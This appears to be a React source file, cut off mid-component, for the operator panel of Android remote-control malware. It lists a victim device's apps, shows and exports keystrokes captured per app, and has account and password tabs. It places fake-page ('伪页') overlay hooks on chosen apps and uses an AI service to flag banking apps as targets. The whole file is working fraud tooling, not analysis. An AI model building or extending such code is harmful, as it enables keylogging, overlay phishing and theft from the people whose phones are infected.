import { Button, Checkbox, Input, Modal, Table, message } from "antd";
import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import {
  analyzeFinanceApps,
  batchMarkFinanceApps,
  fetchFinanceApps,
  fetchCommand,
  fetchInstalledApps,
  fetchKeyboardAppSummaries,
  fetchKeyboardLogs,
  markFinanceApp,
  sendCommand,
  syncInstalledApps,
  unmarkFinanceApp,
  type FinanceAnalyzeCandidate,
} from "../api/client";
import type { InstalledAppInfo, KeyboardLog } from "../types";
import { formatDateTime, formatEpochMs } from "../utils/format";
import { DeviceAppCredentialPanel } from "./DeviceAppCredentialPanel";
import { DeviceFakePageModal } from "./DeviceFakePageModal";
import "../styles/device-app-list-modal.css";

const KEYBOARD_POLL_MS = 15_000;
const APP_REFRESH_POLL_MS = 1500;
const APP_REFRESH_TIMEOUT_MS = 90_000;
const KEYBOARD_PAGE_SIZE = 20;
const KEYBOARD_PAGE_SIZE_OPTIONS = [20, 50, 100, 200, 500];
const KEYBOARD_EXPORT_PAGE_SIZE = 500;
const UNKNOWN_APP_KEY = "__unknown__";

type AppCategoryTab = "default" | "finance";
type DetailTab = "keyboard" | "accounts" | "passwords";

interface DeviceAppListModalProps {
  open: boolean;
  deviceId: string | null;
  deviceLabel?: string;
  isOnline?: boolean;
  onClose: () => void;
  /** 内联到公共操作区，不用 Modal 遮罩 */
  embedded?: boolean;
}

interface AppListItem {
  packageName: string;
  label: string;
  isSystem: boolean;
  versionName: string;
  keyboardCount: number;
  hasKeyboardLogs: boolean;
  fromDevice: boolean;
  /** epoch ms */
  lastUsedTime: number;
  icon?: string | null;
}

function iconSrc(icon: string | null | undefined) {
  const value = icon?.trim();
  if (!value) {
    return null;
  }
  return value.startsWith("data:") ? value : `data:image/png;base64,${value}`;
}

function parseInstalledApps(result: Record<string, unknown> | null | undefined): InstalledAppInfo[] {
  const rawApps = result?.apps;
  if (!Array.isArray(rawApps)) {
    return [];
  }

  const apps: InstalledAppInfo[] = [];
  for (const item of rawApps) {
    if (!item || typeof item !== "object") {
      continue;
    }
    const record = item as Record<string, unknown>;
    const packageName = String(record.packageName ?? "").trim();
    if (!packageName) {
      continue;
    }
    const label = String(record.label ?? record.appName ?? packageName).trim() || packageName;
    const lastUsedRaw = Number(record.lastUsedTime ?? 0);
    apps.push({
      packageName,
      label,
      isSystem: Boolean(record.isSystem),
      versionName: String(record.versionName ?? "").trim(),
      lastUsedTime: Number.isFinite(lastUsedRaw) && lastUsedRaw > 0 ? lastUsedRaw : 0,
    });
  }
  return apps;
}

async function fetchAppIconsFromDevice(deviceId: string, packages: string[]) {
  const unique = [...new Set(packages.map((item) => item.trim()).filter(Boolean))];
  if (unique.length === 0) {
    return {} as Record<string, string>;
  }

  const icons: Record<string, string> = {};
  const chunkSize = 40;
  for (let offset = 0; offset < unique.length; offset += chunkSize) {
    const chunk = unique.slice(offset, offset + chunkSize);
    const command = await sendCommand({
      deviceId,
      cmd: "get_app_icons",
      params: { packages: chunk, size: 48 },
      waitMs: 25000,
    }).catch(() => null);

    if (command?.status !== "success" || !command.result?.icons) {
      continue;
    }
    const payload = command.result.icons;
    if (!payload || typeof payload !== "object") {
      continue;
    }
    for (const [pkg, value] of Object.entries(payload as Record<string, unknown>)) {
      if (typeof value === "string" && value.trim()) {
        icons[pkg] = value.trim();
      }
    }
  }
  return icons;
}

function displayAppName(app: Pick<AppListItem, "label" | "packageName">) {
  const label = app.label.trim();
  if (app.packageName === UNKNOWN_APP_KEY) {
    return label && label !== UNKNOWN_APP_KEY ? label : "未知应用";
  }
  if (label && label !== app.packageName) {
    return label;
  }
  return label || app.packageName;
}

function packageKey(appPackage: string | null) {
  return appPackage?.trim() || UNKNOWN_APP_KEY;
}

function displayPackageName(packageName: string) {
  return packageName === UNKNOWN_APP_KEY ? "未知应用" : packageName;
}

function escapeCsvCell(value: string) {
  if (/[",\n\r]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}

function safeFilename(name: string) {
  return name.replace(/[\\/:*?"<>|]+/g, "_").trim() || "keyboard";
}

function downloadCsv(filename: string, rows: string[][]) {
  const csv = rows.map((row) => row.map(escapeCsvCell).join(",")).join("\r\n");
  const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}

export function DeviceAppListModal({
  open,
  deviceId,
  deviceLabel,
  isOnline = false,
  onClose,
  embedded = false,
}: DeviceAppListModalProps) {
  const [loadingApps, setLoadingApps] = useState(false);
  const [syncingApps, setSyncingApps] = useState(false);
  const [loadingKeyboard, setLoadingKeyboard] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);
  const [apps, setApps] = useState<AppListItem[]>([]);
  const [selectedPackage, setSelectedPackage] = useState<string | null>(null);
  const [keyboardLogs, setKeyboardLogs] = useState<KeyboardLog[]>([]);
  const [keyboardTotal, setKeyboardTotal] = useState(0);
  const [keyboardPage, setKeyboardPage] = useState(1);
  const [keyboardPageSize, setKeyboardPageSize] = useState(KEYBOARD_PAGE_SIZE);
  const [exportingKeyboard, setExportingKeyboard] = useState(false);
  const [searchText, setSearchText] = useState("");
  const [showSystemApps, setShowSystemApps] = useState(true);
  const [categoryTab, setCategoryTab] = useState<AppCategoryTab>("default");
  const [detailTab, setDetailTab] = useState<DetailTab>("keyboard");
  const [financePackages, setFinancePackages] = useState<Set<string>>(new Set());
  const [markingPackage, setMarkingPackage] = useState<string | null>(null);
  const [fakePageTarget, setFakePageTarget] = useState<AppListItem | null>(null);
  const [fakePageHookPackages, setFakePageHookPackages] = useState<Set<string>>(new Set());
  const [openingPackage, setOpeningPackage] = useState<string | null>(null);
  const [analyzingFinance, setAnalyzingFinance] = useState(false);
  const [confirmOpen, setConfirmOpen] = useState(false);
  const [candidates, setCandidates] = useState<FinanceAnalyzeCandidate[]>([]);
  const [selectedPackages, setSelectedPackages] = useState<string[]>([]);
  const [applyingMarks, setApplyingMarks] = useState(false);
  const pollTimerRef = useRef<number | undefined>(undefined);
  const appRefreshSeqRef = useRef(0);

  const loadFinanceMarks = useCallback(async () => {
    try {
      const list = await fetchFinanceApps();
      setFinancePackages(new Set(list.map((item) => item.packageName)));
    } catch {
      setFinancePackages(new Set());
    }
  }, []);

  const loadFakePageHooks = useCallback(async () => {
    if (!deviceId || !isOnline) {
      setFakePageHookPackages(new Set());
      return;
    }
    try {
      const command = await sendCommand({
        deviceId,
        cmd: "list_fake_page_hooks",
        params: {},
        waitMs: 8000,
      });
      if (command.status !== "success") {
        setFakePageHookPackages(new Set());
        return;
      }
      const raw = command.result?.hooks;
      const next = new Set<string>();
      if (Array.isArray(raw)) {
        for (const item of raw) {
          if (!item || typeof item !== "object") {
            continue;
          }
          const pkg = String((item as { packageName?: unknown }).packageName ?? "").trim();
          if (pkg) {
            next.add(pkg);
          }
        }
      }
      setFakePageHookPackages(next);
    } catch {
      setFakePageHookPackages(new Set());
    }
  }, [deviceId, isOnline]);

  const mergeAndSetApps = useCallback(
    async (
      installedApps: Array<{
        packageName: string;
        label: string;
        isSystem: boolean;
        versionName: string;
        lastUsedTime?: number;
        fromInstalledDb: boolean;
      }>,
      options?: { fetchIcons?: boolean },
    ) => {
      if (!deviceId) {
        return;
      }

      const summaries = await fetchKeyboardAppSummaries(deviceId);
      const summaryMap = new Map<
        string,
        { count: number; appLabel: string | null; lastCapturedAtMs: number }
      >();
      for (const item of summaries) {
        const capturedMs = Date.parse(item.lastCapturedAt);
        summaryMap.set(packageKey(item.appPackage), {
          count: item.count,
          appLabel: item.appLabel,
          lastCapturedAtMs: Number.isFinite(capturedMs) ? capturedMs : 0,
        });
      }

      const merged = new Map<string, AppListItem>();

      for (const app of installedApps) {
        const summary = summaryMap.get(app.packageName);
        const count = summary?.count ?? 0;
        const lastUsedTime = Math.max(app.lastUsedTime ?? 0, summary?.lastCapturedAtMs ?? 0);
        merged.set(app.packageName, {
          packageName: app.packageName,
          label: app.label,
          isSystem: app.isSystem,
          versionName: app.versionName,
          keyboardCount: count,
          hasKeyboardLogs: count > 0,
          fromDevice: app.fromInstalledDb,
          lastUsedTime,
          icon: null,
        });
        summaryMap.delete(app.packageName);
      }

      for (const [pkg, summary] of summaryMap.entries()) {
        const packageName = pkg === UNKNOWN_APP_KEY ? UNKNOWN_APP_KEY : pkg;
        const storedLabel = summary.appLabel?.trim();
        const label =
          storedLabel && storedLabel !== packageName
            ? storedLabel
            : displayPackageName(packageName);
        merged.set(packageName, {
          packageName,
          label,
          isSystem: false,
          versionName: "",
          keyboardCount: summary.count,
          hasKeyboardLogs: summary.count > 0,
          fromDevice: false,
          lastUsedTime: summary.lastCapturedAtMs,
          icon: null,
        });
      }

      const nextApps = Array.from(merged.values()).sort((a, b) => {
        if (a.hasKeyboardLogs !== b.hasKeyboardLogs) {
          return a.hasKeyboardLogs ? -1 : 1;
        }
        if (a.lastUsedTime !== b.lastUsedTime) {
          return b.lastUsedTime - a.lastUsedTime;
        }
        return a.label.localeCompare(b.label, "zh-CN");
      });

      setApps(nextApps);
      setSelectedPackage((current) => {
        if (current && nextApps.some((item) => item.packageName === current)) {
          return current;
        }
        const firstWithLogs = nextApps.find((item) => item.hasKeyboardLogs);
        return firstWithLogs?.packageName ?? nextApps[0]?.packageName ?? null;
      });

      if (options?.fetchIcons && isOnline) {
        const packagesForIcons = nextApps
          .filter((app) => app.packageName !== UNKNOWN_APP_KEY)
          .map((app) => app.packageName);
        void fetchAppIconsFromDevice(deviceId, packagesForIcons)
          .then((icons) => {
            if (Object.keys(icons).length === 0) {
              return;
            }
            setApps((current) =>
              current.map((app) => {
                const icon = icons[app.packageName];
                return icon ? { ...app, icon } : app;
              }),
            );
          })
          .catch(() => {
            // 图标失败不影响列表
          });
      }
    },
    [deviceId, isOnline],
  );

  const loadAppsFromDb = useCallback(async () => {
    if (!deviceId) {
      return;
    }

    setLoadingApps(true);
    setErrorText(null);

    try {
      const [dbApps] = await Promise.all([
        fetchInstalledApps(deviceId),
        loadFinanceMarks(),
        loadFakePageHooks(),
      ]);
      await mergeAndSetApps(
        dbApps.map((app) => ({
          packageName: app.packageName,
          label: app.label || app.packageName,
          isSystem: app.isSystem,
          versionName: app.versionName,
          lastUsedTime: app.lastUsedTime,
          fromInstalledDb: true,
        })),
        { fetchIcons: isOnline },
      );
    } catch (error: unknown) {
      const text = error instanceof Error ? error.message : "load_failed";
      setErrorText(text);
      setApps([]);
      setSelectedPackage(null);
    } finally {
      setLoadingApps(false);
    }
  }, [deviceId, isOnline, loadFakePageHooks, loadFinanceMarks, mergeAndSetApps]);

  const refreshAppsFromDevice = useCallback(async () => {
    if (!deviceId) {
      return;
    }
    if (!isOnline) {
      message.warning("设备离线，无法从设备刷新应用");
      return;
    }

    const generation = appRefreshSeqRef.current + 1;
    appRefreshSeqRef.current = generation;
    setSyncingApps(true);
    setErrorText(null);

    const stillCurrent = () => appRefreshSeqRef.current === generation;

    try {
      const accepted = await sendCommand({
        deviceId,
        cmd: "get_installed_apps",
        params: { includeSystem: true },
        waitMs: 0,
      });
      if (!stillCurrent()) {
        return;
      }
      message.info("已下发，正在异步刷新应用列表");

      const deadline = Date.now() + APP_REFRESH_TIMEOUT_MS;
      let latest = accepted;
      while (Date.now() < deadline) {
        if (!stillCurrent()) {
          return;
        }
        if (latest.status === "success" || latest.status === "failed" || latest.status === "timeout") {
          break;
        }
        await new Promise((resolve) => window.setTimeout(resolve, APP_REFRESH_POLL_MS));
        if (!stillCurrent()) {
          return;
        }
        latest = await fetchCommand(accepted.id);
      }

      if (!stillCurrent()) {
        return;
      }
      if (latest.status !== "success" || !latest.result) {
        throw new Error(
          latest.errorMessage ??
            (latest.status === "sent" ? "刷新超时，请稍后重试" : "get_installed_apps_failed"),
        );
      }

      const installedApps = parseInstalledApps(latest.result);
      await syncInstalledApps(
        deviceId,
        installedApps.map((app) => ({
          packageName: app.packageName,
          label: app.label,
          isSystem: app.isSystem,
          versionName: app.versionName,
          lastUsedTime: app.lastUsedTime ?? 0,
        })),
      );
      if (!stillCurrent()) {
        return;
      }
      message.success(`已同步 ${installedApps.length} 个应用到数据库`);
      await loadAppsFromDb();
    } catch (error: unknown) {
      if (!stillCurrent()) {
        return;
      }
      const text = error instanceof Error ? error.message : "sync_failed";
      setErrorText(text);
      message.error(text);
    } finally {
      if (stillCurrent()) {
        setSyncingApps(false);
      }
    }
  }, [deviceId, isOnline, loadAppsFromDb]);

  const loadKeyboardLogs = useCallback(
    async (packageName: string | null, page: number, pageSize: number) => {
      if (!deviceId || !packageName) {
        setKeyboardLogs([]);
        setKeyboardTotal(0);
        return;
      }

      setLoadingKeyboard(true);
      try {
        const queryPackage =
          packageName === UNKNOWN_APP_KEY ? UNKNOWN_APP_KEY : packageName;
        const result = await fetchKeyboardLogs(
          deviceId,
          pageSize,
          queryPackage,
          page,
        );
        setKeyboardLogs(result.items);
        setKeyboardTotal(result.total);
        if (result.page !== page) {
          setKeyboardPage(result.page);
        }
        if (result.pageSize !== pageSize) {
          setKeyboardPageSize(result.pageSize);
        }
      } catch (error: unknown) {
        const text = error instanceof Error ? error.message : "keyboard_load_failed";
        setErrorText(text);
        setKeyboardLogs([]);
        setKeyboardTotal(0);
      } finally {
        setLoadingKeyboard(false);
      }
    },
    [deviceId],
  );

  useEffect(() => {
    window.clearInterval(pollTimerRef.current);

    if (!open || !deviceId) {
      appRefreshSeqRef.current += 1;
      setSyncingApps(false);
      setApps([]);
      setKeyboardLogs([]);
      setKeyboardTotal(0);
      setKeyboardPage(1);
      setSelectedPackage(null);
      setSearchText("");
      setErrorText(null);
      setCategoryTab("default");
      setDetailTab("keyboard");
      setFinancePackages(new Set());
      setFakePageHookPackages(new Set());
      setConfirmOpen(false);
      setCandidates([]);
      setSelectedPackages([]);
      setAnalyzingFinance(false);
      setApplyingMarks(false);
      return;
    }

    void loadAppsFromDb();

    return () => {
      window.clearInterval(pollTimerRef.current);
    };
  }, [deviceId, loadAppsFromDb, open]);

  useEffect(() => {
    window.clearInterval(pollTimerRef.current);

    if (!open || !deviceId || !selectedPackage || detailTab !== "keyboard") {
      if (detailTab !== "keyboard") {
        return;
      }
      setKeyboardLogs([]);
      setKeyboardTotal(0);
      return;
    }

    void loadKeyboardLogs(selectedPackage, keyboardPage, keyboardPageSize);

    pollTimerRef.current = window.setInterval(() => {
      void loadKeyboardLogs(selectedPackage, keyboardPage, keyboardPageSize);
    }, KEYBOARD_POLL_MS);

    return () => {
      window.clearInterval(pollTimerRef.current);
    };
  }, [detailTab, deviceId, keyboardPage, keyboardPageSize, loadKeyboardLogs, open, selectedPackage]);

  const selectAppPackage = useCallback((packageName: string) => {
    setSelectedPackage(packageName);
    setKeyboardPage(1);
    setDetailTab("keyboard");
  }, []);

  const keyboardTotalPages = Math.max(1, Math.ceil(keyboardTotal / keyboardPageSize));
  const keyboardRowOffset = (keyboardPage - 1) * keyboardPageSize;

  const filteredApps = useMemo(() => {
    const keyword = searchText.trim().toLowerCase();
    return apps.filter((app) => {
      const isFinance = financePackages.has(app.packageName);
      if (categoryTab === "finance" ? !isFinance : isFinance) {
        return false;
      }
      if (!showSystemApps && app.isSystem) {
        return false;
      }
      if (!keyword) {
        return true;
      }
      return (
        app.label.toLowerCase().includes(keyword) ||
        app.packageName.toLowerCase().includes(keyword) ||
        displayAppName(app).toLowerCase().includes(keyword)
      );
    });
  }, [apps, categoryTab, financePackages, searchText, showSystemApps]);

  const tabCounts = useMemo(() => {
    let defaultCount = 0;
    let financeCount = 0;
    for (const app of apps) {
      if (financePackages.has(app.packageName)) {
        financeCount += 1;
      } else {
        defaultCount += 1;
      }
    }
    return { defaultCount, financeCount };
  }, [apps, financePackages]);

  const selectedApp = useMemo(
    () => apps.find((item) => item.packageName === selectedPackage) ?? null,
    [apps, selectedPackage],
  );

  async function exportKeyboardLogs() {
    if (!deviceId || !selectedPackage || exportingKeyboard || keyboardTotal === 0) {
      return;
    }
    setExportingKeyboard(true);
    try {
      const queryPackage =
        selectedPackage === UNKNOWN_APP_KEY ? UNKNOWN_APP_KEY : selectedPackage;
      const all: KeyboardLog[] = [];
      let page = 1;
      let total = 0;
      do {
        const result = await fetchKeyboardLogs(
          deviceId,
          KEYBOARD_EXPORT_PAGE_SIZE,
          queryPackage,
          page,
        );
        total = result.total;
        if (result.items.length === 0) {
          break;
        }
        all.push(...result.items);
        page += 1;
      } while (all.length < total);

      const appName = selectedApp ? displayAppName(selectedApp) : displayPackageName(selectedPackage);
      downloadCsv(`${safeFilename(appName)}-键盘记录.csv`, [
        ["序号", "输入内容", "采集时间"],
        ...all.map((item, index) => [
          String(index + 1),
          item.text ?? "",
          formatDateTime(item.capturedAt),
        ]),
      ]);
      message.success(`已导出 ${all.length} 条键盘记录`);
    } catch (error: unknown) {
      const text = error instanceof Error ? error.message : "export_failed";
      message.error(`导出失败：${text}`);
    } finally {
      setExportingKeyboard(false);
    }
  }

  async function handleOpenApp(app: AppListItem) {
    if (!deviceId || !isOnline) {
      message.warning("设备离线，无法打开应用");
      return;
    }
    if (app.packageName === UNKNOWN_APP_KEY) {
      message.warning("未知应用无法打开");
      return;
    }
    setOpeningPackage(app.packageName);
    try {
      const command = await sendCommand({
        deviceId,
        cmd: "open_app",
        params: { packageName: app.packageName },
        waitMs: 8000,
      });
      if (command.status !== "success") {
        throw new Error(command.errorMessage ?? command.status);
      }
      message.success(`已打开 ${displayAppName(app)}`);
    } catch (error) {
      message.error(error instanceof Error ? error.message : "打开失败");
    } finally {
      setOpeningPackage(null);
    }
  }

  async function handleToggleFinance(app: AppListItem) {
    if (app.packageName === UNKNOWN_APP_KEY) {
      return;
    }
    const isFinance = financePackages.has(app.packageName);
    setMarkingPackage(app.packageName);
    try {
      if (isFinance) {
        await unmarkFinanceApp(app.packageName);
        setFinancePackages((current) => {
          const next = new Set(current);
          next.delete(app.packageName);
          return next;
        });
        message.success("已取消金融标记");
      } else {
        await markFinanceApp(app.packageName, displayAppName(app));
        setFinancePackages((current) => {
          const next = new Set(current);
          next.add(app.packageName);
          return next;
        });
        message.success("已标记为金融应用");
      }
    } catch (error) {
      message.error(error instanceof Error ? error.message : "标记失败");
    } finally {
      setMarkingPackage(null);
    }
  }

  async function handleAiAnalyzeFinance() {
    const targets = apps.filter(
      (app) =>
        app.packageName !== UNKNOWN_APP_KEY &&
        !financePackages.has(app.packageName) &&
        !app.isSystem,
    );
    if (targets.length === 0) {
      message.info("默认应用中没有可分析的非系统应用");
      return;
    }

    setAnalyzingFinance(true);
    try {
      const result = await analyzeFinanceApps(
        targets.map((app) => ({
          packageName: app.packageName,
          label: displayAppName(app),
        })),
      );
      const next = result.candidates ?? [];
      if (next.length === 0) {
        message.info("未识别到金融应用");
        return;
      }
      setCandidates(next);
      setSelectedPackages(
        next.filter((item) => item.selectedByDefault).map((item) => item.packageName),
      );
      setConfirmOpen(true);
    } catch (error) {
      const text = error instanceof Error ? error.message : "ai_analyze_failed";
      if (text === "ai_disabled") {
        message.error("AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存");
      } else if (text === "ai_api_key_missing") {
        message.error("请先在左侧菜单「AI 配置」中填写 API Key 并保存");
      } else if (text.startsWith("apiyi_request_failed:")) {
        message.error(`APIYI 调用失败：${text.replace("apiyi_request_failed:", "").trim()}`);
      } else {
        message.error(text);
      }
    } finally {
      setAnalyzingFinance(false);
    }
  }

  async function handleConfirmAiMarks() {
    const selected = candidates.filter((item) =>
      selectedPackages.includes(item.packageName),
    );
    if (selected.length === 0) {
      message.warning("请至少勾选一个应用");
      return;
    }
    setApplyingMarks(true);
    try {
      await batchMarkFinanceApps(
        selected.map((item) => ({
          packageName: item.packageName,
          label: item.label,
        })),
      );
      setFinancePackages((current) => {
        const next = new Set(current);
        for (const item of selected) {
          next.add(item.packageName);
        }
        return next;
      });
      message.success(`已标记 ${selected.length} 个金融应用`);
      setConfirmOpen(false);
      setCandidates([]);
      setSelectedPackages([]);
      setCategoryTab("finance");
    } catch (error) {
      message.error(error instanceof Error ? error.message : "批量标记失败");
    } finally {
      setApplyingMarks(false);
    }
  }

  const listBody = (
      <>
      <div className="device-app-list-toolbar">
        <p className="device-app-list-hint">
          默认从数据库读取已同步的安装列表；点「异步刷新」会先下发指令，设备回报后再入库。金融标记为全局。
          「AI 金融分析」只扫默认应用中的非系统未标记项，确认后写入全局金融库。
        </p>
        <div className="device-app-list-toolbar-actions">
          <Button
            loading={analyzingFinance}
            disabled={!deviceId || analyzingFinance || apps.length === 0}
            onClick={() => void handleAiAnalyzeFinance()}
          >
            AI 金融分析
          </Button>
          <Button
            loading={syncingApps || loadingApps}
            disabled={!deviceId || !isOnline}
            onClick={() => void refreshAppsFromDevice()}
          >
            异步刷新
          </Button>
        </div>
      </div>

      {!isOnline ? (
        <div className="device-app-list-offline">
          设备离线：仅展示数据库中已同步的安装应用与键盘历史；上线后点「异步刷新」可更新安装列表入库。
        </div>
      ) : null}

      {errorText ? <div className="device-app-list-error">{errorText}</div> : null}

      <div className="device-app-list-layout">
        <section className="device-app-list-pane">
          <div className="device-app-list-pane-head">
            <div className="device-app-list-tabs" role="tablist" aria-label="应用分类">
              <button
                type="button"
                role="tab"
                aria-selected={categoryTab === "default"}
                className={`device-app-list-tab ${categoryTab === "default" ? "is-active" : ""}`}
                onClick={() => setCategoryTab("default")}
              >
                默认应用 ({tabCounts.defaultCount})
              </button>
              <button
                type="button"
                role="tab"
                aria-selected={categoryTab === "finance"}
                className={`device-app-list-tab ${categoryTab === "finance" ? "is-active" : ""}`}
                onClick={() => setCategoryTab("finance")}
              >
                金融应用 ({tabCounts.financeCount})
              </button>
            </div>
            <Input
              allowClear
              placeholder="搜索应用名 / 包名"
              value={searchText}
              onChange={(event) => setSearchText(event.target.value)}
            />
            <label className="device-app-list-toggle">
              <input
                type="checkbox"
                checked={showSystemApps}
                onChange={(event) => setShowSystemApps(event.target.checked)}
              />
              显示系统应用
            </label>
          </div>

          {loadingApps && apps.length === 0 ? (
            <div className="device-app-list-empty">加载应用中…</div>
          ) : filteredApps.length === 0 ? (
            <div className="device-app-list-empty">
              {categoryTab === "finance"
                ? "暂无金融应用（可先在默认应用中标记）"
                : "暂无应用数据，请在线后点「异步刷新」入库"}
            </div>
          ) : (
            <div className="device-app-list-scroll">
              {filteredApps.map((app) => {
                const active = app.packageName === selectedPackage;
                const isFinance = financePackages.has(app.packageName);
                const canFakePage =
                  app.packageName !== UNKNOWN_APP_KEY && Boolean(deviceId);
                const canMarkFinance =
                  app.packageName !== UNKNOWN_APP_KEY && Boolean(deviceId);
                const canOpenApp =
                  isOnline &&
                  app.fromDevice &&
                  app.packageName !== UNKNOWN_APP_KEY &&
                  Boolean(deviceId);
                return (
                  <div
                    key={app.packageName}
                    className={`device-app-list-item ${active ? "active" : ""}`}
                    onClick={() => selectAppPackage(app.packageName)}
                    onKeyDown={(event) => {
                      if (event.key === "Enter" || event.key === " ") {
                        selectAppPackage(app.packageName);
                      }
                    }}
                    role="button"
                    tabIndex={0}
                  >
                    <div className="device-app-list-item-main">
                      {iconSrc(app.icon) ? (
                        <img
                          className="device-app-list-item-icon"
                          src={iconSrc(app.icon)!}
                          alt=""
                          loading="lazy"
                        />
                      ) : (
                        <div className="device-app-list-item-icon device-app-list-item-icon--placeholder">
                          {displayAppName(app).slice(0, 1).toUpperCase()}
                        </div>
                      )}
                      <div className="device-app-list-item-body">
                        <div className="device-app-list-item-title">
                          <span className="device-app-list-item-name">{displayAppName(app)}</span>
                          {isFinance ? (
                            <span className="device-app-list-badge device-app-list-badge--finance">
                              金融
                            </span>
                          ) : null}
                          {fakePageHookPackages.has(app.packageName) ? (
                            <span className="device-app-list-badge device-app-list-badge--fake-page">
                              伪页
                            </span>
                          ) : null}
                          {app.hasKeyboardLogs ? (
                            <span className="device-app-list-badge">{app.keyboardCount}</span>
                          ) : null}
                        </div>
                        <div className="device-app-list-item-meta">
                          <span className="device-app-list-item-package">
                            包名：{displayPackageName(app.packageName)}
                          </span>
                          {app.isSystem ? <span> · 系统</span> : null}
                          {!app.fromDevice ? <span> · 仅历史记录</span> : null}
                        </div>
                        <div className="device-app-list-item-meta">
                          最后使用：{formatEpochMs(app.lastUsedTime)}
                        </div>
                      </div>
                    </div>
                    {canOpenApp || canFakePage || canMarkFinance ? (
                      <div className="device-app-list-item-actions">
                        {canOpenApp ? (
                          <Button
                            size="small"
                            loading={openingPackage === app.packageName}
                            disabled={openingPackage !== null}
                            onClick={(event) => {
                              event.stopPropagation();
                              void handleOpenApp(app);
                            }}
                          >
                            打开
                          </Button>
                        ) : null}
                        {canFakePage ? (
                          <Button
                            size="small"
                            type="primary"
                            ghost
                            onClick={(event) => {
                              event.stopPropagation();
                              setFakePageTarget(app);
                            }}
                          >
                            伪页
                          </Button>
                        ) : null}
                        {canMarkFinance ? (
                          <Button
                            size="small"
                            type={isFinance ? "default" : "dashed"}
                            loading={markingPackage === app.packageName}
                            disabled={markingPackage !== null}
                            onClick={(event) => {
                              event.stopPropagation();
                              void handleToggleFinance(app);
                            }}
                          >
                            {isFinance ? "取消金融" : "标为金融"}
                          </Button>
                        ) : null}
                      </div>
                    ) : null}
                  </div>
                );
              })}
            </div>
          )}
        </section>

        <section className="device-app-list-pane device-app-list-pane--keyboard">
          <div className="device-app-list-pane-head">
            <strong>
              {selectedApp
                ? `${displayAppName(selectedApp)} 详情`
                : "应用详情"}
            </strong>
            {selectedApp ? (
              <div className="device-app-list-pane-meta">
                <span>应用名：{displayAppName(selectedApp)}</span>
                <span>包名：{displayPackageName(selectedApp.packageName)}</span>
              </div>
            ) : (
              <span className="device-app-list-pane-sub">请选择应用</span>
            )}
            {selectedPackage ? (
              <div className="device-app-list-detail-tabs" role="tablist" aria-label="详情分类">
                <button
                  type="button"
                  role="tab"
                  aria-selected={detailTab === "keyboard"}
                  className={`device-app-list-tab ${detailTab === "keyboard" ? "is-active" : ""}`}
                  onClick={() => setDetailTab("keyboard")}
                >
                  键盘记录
                </button>
                <button
                  type="button"
                  role="tab"
                  aria-selected={detailTab === "accounts"}
                  className={`device-app-list-tab ${detailTab === "accounts" ? "is-active" : ""}`}
                  onClick={() => setDetailTab("accounts")}
                >
                  账号管理
                </button>
                <button
                  type="button"
                  role="tab"
                  aria-selected={detailTab === "passwords"}
                  className={`device-app-list-tab ${detailTab === "passwords" ? "is-active" : ""}`}
                  onClick={() => setDetailTab("passwords")}
                >
                  密码管理
                </button>
              </div>
            ) : null}
          </div>

          {!selectedPackage || !deviceId ? (
            <div className="device-app-list-empty">请从左侧选择一个应用</div>
          ) : (
            <DeviceAppCredentialPanel
              deviceId={deviceId}
              packageName={selectedPackage}
              appLabel={selectedApp ? displayAppName(selectedApp) : selectedPackage}
              activeTab={detailTab}
              keyboardContent={
                ((): ReactNode => {
                  if (loadingKeyboard && keyboardLogs.length === 0) {
                    return <div className="device-app-list-empty">加载键盘记录中…</div>;
                  }
                  if (keyboardLogs.length === 0) {
                    return (
                      <div className="device-app-list-empty">该应用暂无键盘输入记录</div>
                    );
                  }
                  return (
                    <>
                      <div className="device-app-list-keyboard-toolbar">
                        <button
                          type="button"
                          className="device-app-list-refresh"
                          disabled={exportingKeyboard || keyboardTotal === 0}
                          onClick={() => void exportKeyboardLogs()}
                        >
                          {exportingKeyboard ? "导出中…" : "导出表格"}
                        </button>
                      </div>
                      <div className="device-app-list-keyboard-wrap">
                        <table className="device-app-list-keyboard-table">
                          <thead>
                            <tr>
                              <th>序号</th>
                              <th>输入内容</th>
                              <th>采集时间</th>
                            </tr>
                          </thead>
                          <tbody>
                            {keyboardLogs.map((item, index) => (
                              <tr key={item.id}>
                                <td>{keyboardRowOffset + index + 1}</td>
                                <td className="device-app-list-keyboard-text">{item.text}</td>
                                <td>{formatDateTime(item.capturedAt)}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                      <footer className="device-app-list-keyboard-pagination">
                        <span>共 {keyboardTotal} 条</span>
                        <label>
                          每页
                          <select
                            value={keyboardPageSize}
                            disabled={loadingKeyboard}
                            onChange={(event) => {
                              setKeyboardPageSize(Number(event.target.value));
                              setKeyboardPage(1);
                            }}
                          >
                            {KEYBOARD_PAGE_SIZE_OPTIONS.map((size) => (
                              <option key={size} value={size}>
                                {size} 条/页
                              </option>
                            ))}
                          </select>
                        </label>
                        <div className="device-app-list-keyboard-pages">
                          <button
                            type="button"
                            className="device-app-list-refresh"
                            disabled={loadingKeyboard || keyboardPage <= 1}
                            onClick={() =>
                              setKeyboardPage((current) => Math.max(1, current - 1))
                            }
                          >
                            上一页
                          </button>
                          <span>
                            {keyboardPage} / {keyboardTotalPages}
                          </span>
                          <button
                            type="button"
                            className="device-app-list-refresh"
                            disabled={loadingKeyboard || keyboardPage >= keyboardTotalPages}
                            onClick={() =>
                              setKeyboardPage((current) =>
                                Math.min(keyboardTotalPages, current + 1),
                              )
                            }
                          >
                            下一页
                          </button>
                        </div>
                      </footer>
                    </>
                  );
                })()
              }
            />
          )}
        </section>
      </div>
      <DeviceFakePageModal
        open={Boolean(fakePageTarget)}
        deviceId={deviceId}
        isOnline={isOnline}
        packageName={fakePageTarget?.packageName ?? ""}
        appLabel={fakePageTarget ? displayAppName(fakePageTarget) : ""}
        onClose={() => setFakePageTarget(null)}
        onHooksChanged={() => void loadFakePageHooks()}
      />

      <Modal
        title="AI 识别结果 — 确认标记为金融"
        open={confirmOpen}
        onCancel={() => {
          if (applyingMarks) {
            return;
          }
          setConfirmOpen(false);
        }}
        width={720}
        centered={false}
        destroyOnClose
        footer={[
          <Button
            key="high"
            disabled={applyingMarks}
            onClick={() =>
